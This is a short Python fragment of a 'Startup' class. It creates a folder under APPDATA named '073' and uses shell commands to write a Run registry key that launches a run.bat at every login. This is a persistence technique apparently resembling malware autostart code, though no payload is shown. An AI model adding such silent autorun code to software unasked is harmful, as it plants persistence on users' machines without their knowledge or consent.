...
class Startup:
    def __init__(self) -> None:        
        self.working_dir = os.getenv("APPDATA") + "\\073"
    ...
    def regedit(self) -> None:
        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "073", "/f"], shell=True)
        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "073", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)